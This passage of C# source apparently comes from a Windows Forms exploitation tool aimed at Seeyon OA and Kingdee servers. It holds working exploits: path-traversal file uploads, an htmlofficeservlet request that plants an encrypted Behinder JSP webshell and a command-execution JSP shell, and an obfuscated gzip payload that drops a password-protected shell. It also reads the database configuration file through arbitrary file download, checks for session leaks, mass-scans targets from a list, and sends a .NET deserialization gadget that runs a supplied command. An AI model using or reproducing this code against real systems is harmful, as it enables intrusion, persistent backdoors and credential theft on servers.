                byte[] formFooterBytes = System.Text.Encoding.UTF8.GetBytes(formDataFooter);
                requestStream.Write(formFooterBytes, 0, formFooterBytes.Length);
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                string ssss = reader.ReadToEnd();
                JsonDocument doc = JsonDocument.Parse(ssss);

                String res = doc.RootElement.GetProperty("data").GetProperty("filename").GetString();
                String res1 = doc.RootElement.GetProperty("data").GetProperty("link").GetString();

                richTextBox6.AppendText("成功上传:cmd=whoami" + res + "\r\n" + res1 + Environment.NewLine);

            }
            catch (Exception ex)
            {


            }
        }

        public async void yz4()
        {
            try
            {
                var httpClient = new HttpClient();
                var url = textBox15.Text + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/test13.jsp&fileId=2";
                var formData = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(File.ReadAllBytes("test13.txt"));
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/vnd.ms-excel");
                formData.Add(fileContent, "upload", "test13.txt");
                var response = await httpClient.PostAsync(url, formData);
                response.EnsureSuccessStatusCode();
                richTextBox7.Text = "上传成功" + "/test13.jsp" + "密码：Tas9er;";
            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("致远 wpsAssistServlet 漏洞利用失败，请尝试其他方式" + "\n");
            }

        }

        public void aaa()
        {

            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                string url = textBox15.Text + "/yyoa/createMysql.jsp";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET"; //get请求方法
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果
                HttpStatusCode statusCode = response.StatusCode;
                if (s == "")
                {
                    richTextBox7.AppendText("存在致远OA A6 config.jsp未授权访问漏洞" + Environment.NewLine);

                }
                else if (s == "<script>\r\nself.close();\r\nalert('请您重新登录！')\r\ntop.location.href='/yyoa/index.jsp';\r\n</script>")
                {
                    {
                        richTextBox7.AppendText("不存在致远OA A6 config.jsp未授权访问漏洞" + Environment.NewLine);
                    }
                }
            }

            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远OA A6 config.jsp未授权访问漏洞" + Environment.NewLine);
            }
        }

        public void ccc()
        {

            try
            {
                string url = textBox15.Text + "/seeyon/management/status.jsp";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET"; //get请求方法
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果
                HttpStatusCode statusCode = response.StatusCode;
                if (statusCode == HttpStatusCode.OK)
                {

                    richTextBox7.AppendText("存在致远OA A8 status.jsp 信息泄露漏洞" + Environment.NewLine);
                }
                else
                {
                    richTextBox7.AppendText("不存在致远OA A8 status.jsp 信息泄露漏洞" + Environment.NewLine);
                }
            }

            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远OA A8 status.jsp 信息泄露漏洞" + Environment.NewLine);
            }


        }
        public void bbb()
        {
            try
            {
                if (textBox15.Text == "")
                {
                }
                else
                {
                    string url = textBox15.Text + "/seeyon/htmlofficeservlet";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                    request.Method = "GET"; //get请求方法
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                    Stream stream = response.GetResponseStream(); //接收请求
                    StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                    string s = reader.ReadToEnd();  //字符串S读取接收结果
                    HttpStatusCode statusCode = response.StatusCode;
                    if (s == "")
                    {
                        richTextBox7.AppendText("不存在致远A8 htmlofficeservlet上传漏洞" + Environment.NewLine);
                    }
                    else if (s == "DBSTEP V3.0     0               21              0               htmoffice operate err")
                    {
                        richTextBox7.AppendText("[!]可能存在致远A8 htmlofficeservlet上传漏洞" + Environment.NewLine);
                        //ggg();
                    }
                }
            }

            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远A8 htmlofficeservlet上传漏洞" + Environment.NewLine);
            }
        }
        public void ddd()
        {
            try
            {
                if (textBox15.Text == "")
                {

                }
                else
                {
                    string url = textBox15.Text + "/seeyon/thirdpartyController.do.css/..;/ajax.do";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                    request.Method = "GET"; //get请求方法
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                    Stream stream = response.GetResponseStream(); //接收请求
                    StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                    string s = reader.ReadToEnd();  //字符串S读取接收结果
                    if (s.Contains("java.lang.NullPointerException:null"))
                    {
                        richTextBox7.AppendText("[!]可能存在致远OA ajax.do 任意文件上传漏洞" + Environment.NewLine);
                        //eee();
                    }
                    else
                    {
                        richTextBox7.AppendText("不存在致远OA ajax.do 任意文件上传漏洞" + Environment.NewLine);
                    }
                }
            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远OA ajax.do 任意文件上传漏洞" + Environment.NewLine);
            }
        }

        public void eee()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox15.Text + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip";

                //    MessageBox.Show("默认请求路径/mz");
                //     MessageBox.Show("默认执行env命令");
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                request.Method = "POST"; //get请求方法
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                request.ContentType = "application/x-www-form-urlencoded";
                //       request.Credentials = null;
                //    request.Headers.Add("Sec-Fetch-Dest", "document");
                //     request.Headers.Add("Sec-Fetch-Mode", "navigate");
                //    request.Headers.Add("Sec-Fetch-Site", "none");
                //    request.Headers.Add("Sec-Fetch-User", "?1");
                //   request.Headers.Add("X-Requested-With", "XMLHttpRequest");

                string xmlData = "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00";
                //      byte[] postData = Encoding.UTF8.GetBytes(xmlData);
                //   request.ContentLength = postData.Length;
                //  string replacedBody = xmlData.Replace("id", richTextBox5.Text);

                ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                byte[] byte1 = encoding.GetBytes(xmlData);
                request.ContentLength = byte1.Length;
                StreamWriter ss = new StreamWriter(request.GetRequestStream());
                ss.Write(xmlData);
                ss.Flush();
                // button6.Enabled = true;
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);

                String s = streamreader.ReadToEnd();
                //  JObject jobj = JObject.Parse(s);
                //   textBox3.Text = jobj["message"].ToString();

                if (s.Contains("null"))
                {
                    richTextBox7.AppendText(textBox3.Text + "/seeyon/apps_res/addressbook/images/config.jspx" + "pass:rebeyond" + Environment.NewLine);
                }
                {
                    if (s.Contains("被迫下线，原因：与服务器失去连接"))
                    {
                        richTextBox7.AppendText("ajax上传失败" + Environment.NewLine);
                    }
                }
            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("ajax上传失败" + Environment.NewLine);
            }

        }

        public void fff()
        {
            try
            {
                string url = textBox15.Text + "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET"; //get请求方法
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                Stream stream = response.GetResponseStream(); //接收请求
                StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                string s = reader.ReadToEnd();  //字符串S读取接收结果
                if (s.Contains("ctpDataSource.minCount"))
                {
                    richTextBox7.AppendText("[!]存在致远OA webmail.do 任意文件下载漏洞" + s + Environment.NewLine);
                }
                if (s.Contains("java.lang.Exception:404"))
                {
                    richTextBox7.AppendText("不存在致远OA webmail.do 任意文件下载漏洞" + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远OA webmail.do 任意文件下载漏洞" + Environment.NewLine);
            }
        }

        public void session()
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox15.Text + "/seeyon/thirdpartyController.do";
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST"; //POST请求
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                //   req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
                req.ContentType = "application/x-www-form-urlencoded";
                //req.Headers.Add("cmd", textBox17.Text);
                String postid = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1";
                StreamWriter ss = new StreamWriter(req.GetRequestStream());  //请求我们的postid =参数数据
                                                                             // ASCIIEncoding encoding = new ASCIIEncoding(); //编码
                                                                             //  byte[] byte1 = encoding.GetBytes(postid);
                                                                             //   req.ContentLength = byte1.Length;
                ss.Write(postid);
                ss.Flush();
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                Stream getStream = response.GetResponseStream();
                StreamReader streamreader = new StreamReader(getStream, System.Text.Encoding.UTF8);

                string sss = streamreader.ReadToEnd();
                if (sss.Contains("_sessionid"))
                {

                    richTextBox7.AppendText("[!]存在致远OA session泄露漏洞" + Environment.NewLine);
                }
                else
                {

                    richTextBox7.AppendText("不存在致远OA session泄露漏洞" + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                richTextBox7.AppendText("不存在致远OA session泄露漏洞" + Environment.NewLine);
            }
        }

        public async void ggg()
        {
            try
            {
                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
                string url = textBox15.Text + "/seeyon/htmlofficeservlet";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.UserAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)";
                request.Accept = "*/*";
                request.Headers.Add("Accept-Language", "zh-CN,zh;q=0.9");
                request.Headers.Add("Connection", "close");
                request.Headers.Add("Cache-Control", "no-cache");
                request.Headers.Add("Pragma", "no-cache");
                request.ContentType = "application/x-www-form-urlencoded";
                string postData = "DBSTEP V3.0     370             0               4000             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdcRQin1Q/nrS5nHzs\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n111111111111111111111111111111111111111\r\n9df37afc77bdd582d90aefaf4e35c63e<%@page import=\"java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*\" %><%! private byte[] Decrypt(byte[] data) throws Exception { String k=\"e45e329feb5d925b\"; javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),\"AES\")); byte[] decodebs; Class baseCls ; try{ baseCls=Class.forName(\"java.util.Base64\"); Object Decoder=baseCls.getMethod(\"getDecoder\", null).invoke(baseCls, null); decodebs=(byte[]) Decoder.getClass().getMethod(\"decode\", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data}); } catch (Throwable e) { System.out.println(\"444444\"); baseCls = Class.forName(\"sun.misc.BASE64Decoder\"); Object Decoder=baseCls.newInstance(); decodebs=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)}); } return c.doFinal(decodebs); } %><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] buf = new byte[512]; int length=request.getInputStream().read(buf); while (length>0) { byte[] data= Arrays.copyOfRange(buf,0,length); bos.write(data); length=request.getInputStream().read(buf); } new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);} %>";
                byte[] postDataBytes = Encoding.UTF8.GetBytes(postData);
                request.ContentLength = postDataBytes.Length;
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(postDataBytes, 0, postDataBytes.Length);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader reader = new StreamReader(response.GetResponseStream());
                string responseText = reader.ReadToEnd();
                if (responseText == "")
                {
                    richTextBox7.AppendText("致远htmlofficeservlet漏洞利用失败" + Environment.NewLine);
                }
                else
                {
                    richTextBox7.AppendText("上传成功" + "/seeyon/nishizhu.jsp" + "冰蝎aes加密" + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {

                richTextBox7.AppendText("致远htmlofficeservlet模块上传失败，请考虑其他方式" + Environment.NewLine);
            }

        }



        public async void ggg1()
        {

            try
            {


                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
                string url = textBox15.Text + "/seeyon/htmlofficeservlet";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.UserAgent = "Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)";
                request.Accept = "*/*";
                request.Headers.Add("Accept-Language", "zh-CN,zh;q=0.9");
                request.Headers.Add("Connection", "close");
                request.Headers.Add("Cache-Control", "no-cache");
                request.Headers.Add("Pragma", "no-cache");
                request.ContentType = "application/x-www-form-urlencoded";
                string postData = "DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATddaNQeazCbHJUqRjidg66\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n<% if(\"0\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\"); } %>>x\r\n";
                byte[] postDataBytes = Encoding.UTF8.GetBytes(postData);
                request.ContentLength = postDataBytes.Length;
                Stream requestStream = request.GetRequestStream();
                requestStream.Write(postDataBytes, 0, postDataBytes.Length);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader reader = new StreamReader(response.GetResponseStream());
                string responseText = reader.ReadToEnd();



                richTextBox7.AppendText("上传成功" + "/seeyon/qweasdzxc.jsp?pwd=0&i=cmd" + Environment.NewLine);


                {


                }

                {


                }





            }
            catch (Exception ex)
            {

                richTextBox7.AppendText("上传失败，请考虑其他方式" + Environment.NewLine);
            }
        }

        private void button15_Click(object sender, EventArgs e)
        {


            String aa;
            String bb;
            String cc;
            String dd;
            String ee;
            String ff;
            richTextBox7.Text = "正在开始一键检测....." + Environment.NewLine;
            //  aaa();
            bbb();

            ccc();
            ddd();


            fff();
            session();

            if (textBox15.Text == "")
            {

                MessageBox.Show("请输入信息");

            }

            else
            {

                try
                {



                    string url = textBox15.Text + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/test1.jsp&fileId=2";
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                    request.Method = "GET"; //get请求方法
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                    Stream stream = response.GetResponseStream(); //接收请求
                    StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                    string s = reader.ReadToEnd();  //字符串S读取接收结果

                    JObject jobj = JObject.Parse(s);
                    textBox3.Text = jobj["code"].ToString();
                    if (textBox3.Text == "1000")
                    {

                        richTextBox7.AppendText("[!]存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
                        // yz3();

                        yz4();
                    }
                    else
                    {

                        //    richTextBox16.AppendText("不存在致远OA wpsAssistServlet 任意文件上传漏洞"+ Environment.NewLine);
                    }

                }



                catch (Exception ex)
                {

                    richTextBox7.AppendText("不存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);


                }


            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
            if (textBox15.Text == "")
            {
                MessageBox.Show("请输入信息");

            }
            else
            {


            }
            MessageBox.Show("批量只检查wpsAssistServlet上传漏洞");
            ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;

            string dictionaryPath = "SeeyonwpsAssistServlet .txt";
            string[] urls = File.ReadAllLines(dictionaryPath);


            //    foreach (String url in urls)
            //     {



            Task[] tasks = new Task[urls.Length];
            for (int i = 0; i < urls.Length; i++)
            {

                String urla = urls[i];
                tasks[i] = Task.Run(() =>
                {

                    try
                    {



                        String urlss = urla + "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/test1.jsp&fileId=2";
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(urlss);
                        request.Method = "GET";
                        request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                        request.Accept = "*/*";
                        //   request.ContentType = "application/json";
                        HttpWebResponse response = (HttpWebResponse)request.GetResponse();  //发送请求
                        Stream stream = response.GetResponseStream(); //接收请求
                        StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8); //读取数据
                        string s = reader.ReadToEnd();  //字符串S读取接收结果
                        JObject jobj = JObject.Parse(s);
                        textBox3.Text = jobj["code"].ToString();
                        if (textBox3.Text == "1000")
                        {

                            richTextBox7.AppendText(urla + "[!]存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
                            richTextBox7.ForeColor = Color.Green;
                            // yz3();

                        }
                        else
                        {

                            richTextBox7.AppendText("不存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
                        }



                    }





                    catch (Exception ex)
                    {

                        //  richTextBox16.AppendText(urla+"不存在致远OA wpsAssistServlet 任意文件上传漏洞" + Environment.NewLine);
                    }
                });


            }

        }

        private void button17_Click(object sender, EventArgs e)
        {
            try
            {



                ServicePointManager.ServerCertificateValidationCallback += RemoteCertificateValidate;
                String url = textBox16.Text + "/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc";
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST"; //POST请求
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                //   req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
                req.ContentType = "text/json";
                req.Headers.Add("cmd", textBox17.Text);
                String postid = "{\"ap0\":\"AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlhbGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAAAAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkYAAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNpemUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0ZW0uQ29sbGVjdGlvbnMuSUhhc2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJHwAAAAkgAAAADw0AAAAAEAAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnV